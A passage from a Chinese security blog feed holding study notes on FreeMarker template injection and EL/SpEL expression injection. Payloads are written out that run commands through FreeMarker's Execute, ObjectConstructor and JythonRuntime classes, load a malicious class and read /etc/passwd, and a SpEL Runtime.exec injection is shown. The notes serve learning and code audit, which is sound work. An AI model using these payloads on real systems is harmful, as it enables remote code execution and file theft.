    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMarker 模板文件与 HTML 一样都是静态页面，当用户访问页面时，FreeMarker 引擎会进行解析并动态替换模板中的内容进行渲染，然后将渲染后的结果返回到浏览器中。</p><h1 id="0x01-FreeMarker-模板"><a href="#0x01-FreeMarker-模板" class="headerlink" title="0x01 FreeMarker 模板"></a>0x01 FreeMarker 模板</h1><p>FreeMarker 模板语言（FreeMarker Template Language，FTL）由 4 个部分组成，分别如下：</p><ul><li><p>文本：包括 HTML 标签与静态文本等静态内容，该部分内容会原样输出</p></li><li><p>插值：这部分的输出会被模板引擎计算的值来替换，使用 ${} 这种语法</p></li><li><p>标签：和 HTML 标签类似，不会打印在输出的内容中，比如 &lt;#assign name=’bob’&gt;</p></li><li><p>注释：和 HTML 注释类似，由 &lt;#– 和 –&gt; 表示，注释部分的内容会 FreeMarker 忽略</p></li></ul><p>以下是一个 FreeMarker 模板内容示例：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome TeamsSix!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#--</span> <span class="token attr-name">这是注释</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;latestProduct.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;latestProduct.name&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-模板注入利用"><a href="#0x02-模板注入利用" class="headerlink" title="0x02 模板注入利用"></a>0x02 模板注入利用</h1><h2 id="1、new-函数的利用"><a href="#1、new-函数的利用" class="headerlink" title="1、new 函数的利用"></a>1、new 函数的利用</h2><p>FreeMarker 中预制了大量了内建函数，其中 new 函数可以创建一个继承自 freemarker.template.TemplateModel 类的变量，利用这一点能达到执行任意代码的目的。</p><h3 id="利用方法一："><a href="#利用方法一：" class="headerlink" title="利用方法一："></a>利用方法一：</h3><p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p><p>freemarker.template.utility.Execute 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">22</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> arguments<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>    <span class="token class-name">StringBuilder</span> aOutputBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"Need an argument to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">27</span>        <span class="token class-name">String</span> aExecute <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>arguments<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">28</span><span class="token number">29</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">30</span>            <span class="token class-name">Process</span> exec <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>aExecute<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>            <span class="token class-name">InputStream</span> execOut <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token class-name">Throwable</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("open -a Calculator")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001193.png"></p><h3 id="利用方法二："><a href="#利用方法二：" class="headerlink" title="利用方法二："></a>利用方法二：</h3><p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p><p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p><p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">17</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObjectConstructor</span> <span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModelEx</span> <span class="token punctuation">&#123;</span><span class="token number">18</span>     <span class="token keyword">public</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">19</span>     <span class="token punctuation">&#125;</span><span class="token number">20</span> <span class="token number">21</span>     <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">22</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"This method must have at least one argument, the name of the class to instantiate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>             <span class="token class-name">String</span> classname <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>             <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token number">27</span> <span class="token number">28</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">29</span>                 cl <span class="token operator">=</span> <span class="token class-name">ClassUtil</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">31</span>                 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>             <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.ObjectConstructor<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("java.lang.ProcessBuilder","open","-a","Calculator").start()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001213.png"></p><h3 id="利用方法三："><a href="#利用方法三：" class="headerlink" title="利用方法三："></a>利用方法三：</h3><p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p><p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JythonRuntime</span> <span class="token keyword">extends</span> <span class="token class-name">PythonInterpreter</span>    <span class="token keyword">implements</span> <span class="token class-name">TemplateTransformModel</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span> <span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Writer</span> out<span class="token punctuation">,</span>                            <span class="token keyword">final</span> <span class="token class-name">Map</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">StringBuilder</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Environment</span> env <span class="token operator">=</span> <span class="token class-name">Environment</span><span class="token punctuation">.</span><span class="token function">getCurrentEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cbuf<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">JythonRuntime</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">PyObject</span> prevOut <span class="token operator">=</span> systemState<span class="token punctuation">.</span>stdout<span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">exec</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        buf<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>prevOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.JythonRuntime<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>@value</span><span class="token punctuation">></span></span>import os;os.system("open -a Calculator")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>@value</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001223.png"></p><h2 id="2、api-函数的利用"><a href="#2、api-函数的利用" class="headerlink" title="2、api 函数的利用"></a>2、api 函数的利用</h2><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p><p>加载恶意类的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">classLoader</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>object?api.class.getClassLoader()</span><span class="token punctuation">></span></span>$&#123;classLoader.loadClass("Evil.class")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;#assign uri=object?api.class.getResource("/").toURI()>  &lt;#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">is</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>input?api.getInputStream()</span><span class="token punctuation">></span></span>  FILE:[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#list</span> <span class="token attr-name">0..999999999</span> <span class="token attr-name">as</span> <span class="token attr-name">_</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">byte</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>is.read()</span><span class="token punctuation">></span></span>      &lt;#if byte == -1>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#break</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#if</span><span class="token punctuation">></span></span>  $&#123;byte&#125;, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#list</span><span class="token punctuation">></span></span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p><p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p><blockquote><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/215348">https://www.anquanke.com/post/id/215348</a></p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMar</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】表达式注入</title>
    <link href="https://www.teamssix.com/211129-180558.html"/>
    <id>https://www.teamssix.com/211129-180558.html</id>
    <published>2021-11-29T10:05:58.000Z</published>
    <updated>2021-11-29T10:23:05.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。</p><p>在 JSP 中，使用 ${} 来表示 EL 表达式，例如 ${name} 表示获取 name 变量。</p><p>在 EL 表达式中有两种获取对象属性的方法，第一种为 ${param.name}，第二种为 ${param[name]}</p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><p>使用 param 对象获取用户传入的参数值，这里的 ${param.name} 相当于 request.getParameter(“name”)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>h3<span class="token punctuation">></span></span>输入的 name 值为：$<span class="token punctuation">&#123;</span>param<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样当我们访问 <a href="http://xxx:8080/xxx/?name=teamssix">http://xxx:8080/xxx/?name=teamssix</a> 的时候，页面就会返回「输入的 name 值为：teamssix」</p><p>EL 表达式也可以实例化 Java 的内置类，比如 Runtime.class 会执行系统命令</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>$<span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当执行该页面代码时，就可以看到计算器被弹出来了，不过前提是 Tomcat 被部署在 Windows 下，如果在 Linux 下则需要将 calc 换成其他命令，不然会报错 500</p><h3 id="Spring-标签-EL-表达式漏洞（CVE-2011-2730）"><a href="#Spring-标签-EL-表达式漏洞（CVE-2011-2730）" class="headerlink" title="Spring 标签 EL 表达式漏洞（CVE-2011-2730）"></a>Spring 标签 EL 表达式漏洞（CVE-2011-2730）</h3><p>在历史上出现过一个 Spring 标签 EL 表达式漏洞（CVE-2011-2730），Spring 表达式语言（SpEL）是一种与 EL 功能类似的表达式语言。</p><p>在未对用户的输入做严格检查并且错误的使用 Spring 表达式语言时就可能产生表达式注入漏洞。</p><p>在 SpEL 的 Evaluation 接口中，有两个实现方法，分别为 SimpleEvaluationContext 和 StandardEvaluationContext 方法，其中前者权限比较小，后者权限比较大，因此当使用 StandardEvaluation 方法时，就可以利用 Runtime.class 方法执行命令，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">EvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpEL</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> expressionstr <span class="token operator">=</span> <span class="token string">"T(Runtime).getRuntime().exec(\"open -a Calculator\")"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EvaluationContext</span> evaluationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expressionstr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>evaluationContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）</h3><p>对于 2018 年出的 Spring Data Commons RCE 漏洞，RT 可以通过构造 SpEL 表达式实现 RCE</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111291811883.png"></p><p>通过观察官方补丁，可以发现正是将原来的 StandardEvaluationContext 方法换成了 SimpleEvaluationContext 方法。</p><p>补丁地址：<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a?diff=unified#">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">175</span> <span class="token operator">-</span> <span class="token class-name">StandardEvaluationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span 